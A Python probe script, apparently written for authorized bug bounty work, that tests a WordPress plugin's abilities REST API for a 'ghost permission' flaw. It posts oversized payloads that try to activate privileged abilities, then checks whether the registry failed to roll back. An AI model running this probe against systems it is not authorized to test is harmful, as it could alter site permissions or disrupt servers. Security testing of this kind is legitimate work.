#!/usr/bin/env python3
"""
ghost_permission_probe.py — WP Abilities Registry Atomicity Tester

Hypothesis:
    If a POST to /wp-json/wp-abilities/v1/capabilities fails at the DB
    persistence layer (5xx) but the in-memory registry is NOT rolled back,
    the ability appears active despite never being committed — a "ghost
    permission."  This script induces that failure via an oversized metadata
    payload and then immediately verifies the registry state.

Target:     WordPress site running a plugin that exposes the WP Abilities
            REST API (wp-abilities v1).
Auth:       Requires a valid Bearer token with write access to the endpoint.

Usage:
    export WP_CORE_TOKEN=<bearer-token>
    export H1_USER=<your-hackerone-handle>      # optional, defaults to "lucius-probe"

    python3 ghost_permission_probe.py \\
        --target https://example.com \\
        --abilities manage_options edit_posts delete_users

    # JSON output for pipeline integration:
    python3 ghost_permission_probe.py --target https://example.com --output json

    # Adjust payload size and concurrency:
    python3 ghost_permission_probe.py --target https://example.com \\
        --payload-size 200000 --concurrency 5

    # Disable TLS verification for lab/self-signed environments:
    python3 ghost_permission_probe.py --target https://example.com --no-verify

Authorization:
    This tool is for authorized bug bounty / penetration testing only.
    Ensure the target domain is within your program scope before running.

Exit codes:
    0 — all abilities atomic (no findings)
    1 — at least one ghost permission confirmed
    2 — probe errors or inconclusive results (no confirmed ghost permissions)
"""

import argparse
import asyncio
import dataclasses
import json
import logging
import os
import ssl as ssl_module
import sys
from dataclasses import dataclass, field
from typing import Literal

import aiohttp

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Types
# ---------------------------------------------------------------------------

FindingStatus = Literal["GHOST_PERMISSION", "ATOMIC", "INCONCLUSIVE", "ERROR"]


@dataclass
class ProbeResult:
    ability_id: str
    status: FindingStatus
    detail: str
    evidence: dict = field(default_factory=dict)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="WP Abilities Registry atomicity probe — ghost permission detector",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For authorized security research only.",
    )
    p.add_argument(
        "--target", required=True, metavar="URL",
        help="Base URL of the target WordPress instance (e.g. https://example.com)",
    )
    p.add_argument(
        "--abilities", nargs="+", default=["manage_options"],
        metavar="ABILITY",
        help="One or more ability IDs to probe (default: manage_options)",
    )
    p.add_argument(
        "--payload-size", type=int, default=150_000, metavar="BYTES",
        help="Oversized metadata payload size in bytes (default: 150000)",
    )
    p.add_argument(
        "--concurrency", type=int, default=3,
        help="Maximum simultaneous probes (default: 3)",
    )
    p.add_argument(
        "--timeout", type=int, default=20,
        help="Per-request timeout in seconds (default: 20)",
    )
    p.add_argument(
        "--rollback-delay", type=float, default=0.5, metavar="SECONDS",
        help="Seconds to wait after a server error before reading registry state "
             "(default: 0.5 — gives async rollbacks time to complete)",
    )
    p.add_argument(
        "--no-verify", dest="no_verify", action="store_true",
        help="Disable TLS certificate verification (for lab/self-signed certs)",
    )
    p.add_argument(
        "--output", choices=["text", "json"], default="text",
        help="Output format (default: text)",
    )
    return p.parse_args()


# ---------------------------------------------------------------------------
# Session
# ---------------------------------------------------------------------------

def build_session(
    token: str,
    timeout_s: int,
    verify_ssl: bool,
) -> aiohttp.ClientSession:
    ssl_ctx: ssl_module.SSLContext | bool = (
        ssl_module.create_default_context() if verify_ssl else False
    )
    connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=10)
    timeout = aiohttp.ClientTimeout(total=timeout_s)
    return aiohttp.ClientSession(
        headers={
            "Authorization": f"Bearer {token}",
            "X-HackerOne-Research": os.getenv("H1_USER", "lucius-probe"),
        },
        timeout=timeout,
        connector=connector,
    )


# ---------------------------------------------------------------------------
# Core probe logic
# ---------------------------------------------------------------------------

async def _get_ability_state(
    session: aiohttp.ClientSession,
    url: str,
    label: str,
) -> tuple[str, dict]:
    """
    GET the current state of a single ability from the registry.
    Returns (state_string, raw_response_dict).
    Raises on network or parse failure so the caller can handle it.
    """
    async with session.get(url) as resp:
        data = await resp.json(content_type=None)
        state = data.get("state", "unknown")
        log.debug("[%s] GET %s → state=%s", label, url, state)
        return state, data


async def probe_ability(
    session: aiohttp.ClientSession,
    endpoint: str,
    ability_id: str,
    oversized_meta: str,
    sem: asyncio.Semaphore,
    rollback_delay: float,
) -> ProbeResult:
    """
    Probe a single ability for ghost-permission atomicity gaps.

    Steps:
        1. Baseline GET  — record the ability's state before mutation.
        2. Mutation POST — send an oversized metadata payload to induce
                           a DB persistence failure.
        3. Distinguish   — 422 is a field-validation rejection (not a DB
                           failure); only 5xx signals a server-side error.
        4. Verify GET    — after a brief delay, re-read the registry.
        5. Classify      — compare pre/post states to determine the result.
    """
    ability_url = f"{endpoint}/{ability_id}"

    async with sem:
        # ------------------------------------------------------------------
        # Step 1: Baseline
        # ------------------------------------------------------------------
        try:
            baseline_state, baseline_data = await _get_ability_state(
                session, ability_url, ability_id
            )
            log.info("[%s] Baseline state: %s", ability_id, baseline_state)
        except asyncio.TimeoutError:
            return ProbeResult(ability_id, "ERROR", "Baseline GET timed out")
        except aiohttp.ClientError as exc:
            return ProbeResult(ability_id, "ERROR", f"Baseline GET network error: {exc}")
        except Exception as exc:
            return ProbeResult(ability_id, "ERROR", f"Baseline GET failed: {exc}")

        # ------------------------------------------------------------------
        # Step 2: Mutation — send oversized payload
        # ------------------------------------------------------------------
        payload = {
            "ability":  ability_id,
            "state":    "active",
            "metadata": oversized_meta,
        }
        log.info("[%s] Sending oversized payload (%d bytes)...", ability_id, len(oversized_meta))

        try:
            async with session.post(endpoint, json=payload) as resp:
                post_status = resp.status
                try:
                    post_body = await resp.json(content_type=None)
                except Exception:
                    post_body = {"raw": await resp.text()}
        except asyncio.TimeoutError:
            return ProbeResult(ability_id, "ERROR", "Mutation POST timed out")
        except aiohttp.ClientError as exc:
            return ProbeResult(ability_id, "ERROR", f"Mutation POST network error: {exc}")

        # ------------------------------------------------------------------
        # Step 3: Distinguish failure type
        # ------------------------------------------------------------------
        if post_status == 422:
            # 422 = server rejected the field as too long (input validation).
            # This is NOT a DB-layer failure — it never reached the DB.
            # Treat as inconclusive; the caller should try a different strategy
            # (e.g. target a less-validated field, or increase payload size).
            log.warning(
                "[%s] 422 = validation rejection (field too long before DB write). "
                "Not a DB-layer failure — cannot induce atomicity gap this way.",
                ability_id,
            )
            return ProbeResult(
                ability_id, "INCONCLUSIVE",
                "422 is a validation rejection, not a DB failure. "
                "Try a larger payload or target a different field.",
                {"post_status": post_status, "post_body": post_body},
            )

        if post_status not in (500, 503):
            log.info(
                "[%s] POST returned %d — no server error induced. "
                "Adjust payload size or target field.",
                ability_id, post_status,
            )
            return ProbeResult(
                ability_id, "INCONCLUSIVE",
                f"No server error triggered (HTTP {post_status}). "
                "Adjust payload strategy.",
                {"post_status": post_status, "post_body": post_body},
            )

        # ------------------------------------------------------------------
        # Step 4: Server error observed — verify registry state
        # ------------------------------------------------------------------
        log.info(
            "[%s] Server error (%d). Waiting %.1fs for async rollback, then checking registry...",
            ability_id, post_status, rollback_delay,
        )
        await asyncio.sleep(rollback_delay)

        try:
            post_state, post_data = await _get_ability_state(
                session, ability_url, ability_id
            )
        except asyncio.TimeoutError:
            return ProbeResult(
                ability_id, "ERROR",
                "Registry verification GET timed out after server error",
                {"post_status": post_status},
            )
        except aiohttp.ClientError as exc:
            return ProbeResult(
                ability_id, "ERROR",
                f"Registry verification GET network error: {exc}",
                {"post_status": post_status},
            )
        except Exception as exc:
            return ProbeResult(
                ability_id, "ERROR",
                f"Registry verification GET failed: {exc}",
                {"post_status": post_status},
            )

        # ------------------------------------------------------------------
        # Step 5: Classify
        # ------------------------------------------------------------------
        evidence = {
            "baseline_state": baseline_state,
            "post_status":    post_status,
            "registry_state": post_state,
            "post_body":      post_body,
        }

        if post_state == "active" and baseline_state != "active":
            log.critical(
                "[%s] GHOST PERMISSION CONFIRMED: ability is ACTIVE in registry "
                "despite DB persistence failure (HTTP %d).",
                ability_id, post_status,
            )
            return ProbeResult(
                ability_id, "GHOST_PERMISSION",
                f"Ability '{ability_id}' is ACTIVE in the registry despite "
                f"DB failure (HTTP {post_status}). "
                "Atomicity gap confirmed — registry was not rolled back.",
                evidence,
            )

        if post_state == "active" and baseline_state == "active":
            log.warning(
                "[%s] Registry shows 'active' post-failure, but ability was "
                "already active at baseline — cannot confirm ghost permission.",
                ability_id,
            )
            return ProbeResult(
                ability_id, "INCONCLUSIVE",
                "Ability was already active before the probe. Cannot confirm "
                "ghost permission without first deactivating it.",
                evidence,
            )

        log.info("[%s] System atomic — registry rolled back correctly.", ability_id)
        return ProbeResult(
            ability_id, "ATOMIC",
            f"Registry state rolled back to '{post_state}' after DB failure. "
            "No atomicity gap detected.",
            evidence,
        )


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

async def run_probes(
    session: aiohttp.ClientSession,
    target_base: str,
    abilities: list[str],
    payload_size: int,
    concurrency: int,
    rollback_delay: float,
) -> list[ProbeResult]:
    endpoint = f"{target_base.rstrip('/')}/wp-json/wp-abilities/v1/capabilities"
    # Compute the oversized string once — not inside each probe call
    oversized_meta = "X" * payload_size
    sem = asyncio.Semaphore(concurrency)

    log.info(
        "Starting probe: %d abilities | payload=%d bytes | concurrency=%d",
        len(abilities), payload_size, concurrency,
    )

    tasks = [
        probe_ability(session, endpoint, ability, oversized_meta, sem, rollback_delay)
        for ability in abilities
    ]
    return await asyncio.gather(*tasks)


# ---------------------------------------------------------------------------
# Output & exit codes
# ---------------------------------------------------------------------------

_STATUS_LABEL: dict[FindingStatus, str] = {
    "GHOST_PERMISSION": "CRITICAL",
    "ATOMIC":           "OK      ",
    "INCONCLUSIVE":     "WARN    ",
    "ERROR":            "ERROR   ",
}


def emit_results(results: list[ProbeResult], fmt: str) -> int:
    """Print results and return the appropriate exit code."""
    if fmt == "json":
        print(json.dumps([dataclasses.asdict(r) for r in results], indent=2))
    else:
        print("\n" + "=" * 64)
        print("  GHOST PERMISSION PROBE — SUMMARY")
        print("=" * 64)
        for r in results:
            label = _STATUS_LABEL[r.status]
            print(f"  [{label}] {r.ability_id}")
            print(f"           {r.detail}")
        print("=" * 64)

        ghosts = [r for r in results if r.status == "GHOST_PERMISSION"]
        if ghosts:
            print(f"\n  {len(ghosts)} ghost permission(s) confirmed. See evidence above.")
        else:
            print("\n  No ghost permissions confirmed.")
        print()

    has_ghost = any(r.status == "GHOST_PERMISSION" for r in results)
    has_error = any(r.status in ("ERROR", "INCONCLUSIVE") for r in results)

    if has_ghost:
        return 1
    if has_error:
        return 2
    return 0


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

async def _main() -> int:
    args = parse_args()

    token = os.getenv("WP_CORE_TOKEN")
    if not token:
        log.error("WP_CORE_TOKEN is not set. Export it before running.")
        return 2

    if args.no_verify:
        import warnings
        import urllib3  # type: ignore[import-untyped]
        warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
        log.warning("TLS certificate verification is DISABLED.")

    async with build_session(token, args.timeout, not args.no_verify) as session:
        results = await run_probes(
            session=session,
            target_base=args.target,
            abilities=args.abilities,
            payload_size=args.payload_size,
            concurrency=args.concurrency,
            rollback_delay=args.rollback_delay,
        )

    return emit_results(results, args.output)


def main() -> None:
    sys.exit(asyncio.run(_main()))


if __name__ == "__main__":
    main()
